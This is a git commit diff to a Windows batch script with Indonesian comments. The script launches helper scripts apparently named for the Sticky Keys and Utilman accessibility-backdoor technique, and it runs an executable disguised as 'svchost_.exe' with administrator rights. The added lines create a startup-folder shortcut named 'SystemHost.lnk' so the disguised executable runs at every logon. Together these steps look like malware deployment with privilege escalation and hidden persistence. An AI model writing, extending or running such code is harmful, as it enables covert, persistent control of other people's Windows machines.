e3cd66a31b0efb7244f366dcfe7138e917d4109a
FooTex16 <hffjhfcvvtugs@yahoo.com>
2025-07-04 23:56:54 +0700

    RunScript.bat

--- RunScript.bat
+++ RunScript.bat
@@ -1,8 +1,21 @@
 @echo off
 :: Menjalankan batch dan exe dengan hak administrator dari folder yang sama
-
 set "currentDir=%~dp0"
 
+:: Jalankan script sebagai Administrator
 powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"
 powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"
 powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"
+
+:: Menambahkan svchost_.exe ke folder Startup
+:: Target: C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe
+set "targetExe=C:\Users\FooTex16\Desktop\XHAMSTER\svchost_.exe"
+set "shortcutName=SystemHost.lnk"
+set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: Buat shortcut menggunakan PowerShell
+powershell -Command ^
+  "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startupFolder%\%shortcutName%'); ^
+   $s.TargetPath='%targetExe%'; ^
+   $s.WorkingDirectory='C:\Users\FooTex16\Desktop\XHAMSTER'; ^
+   $s.Save()"
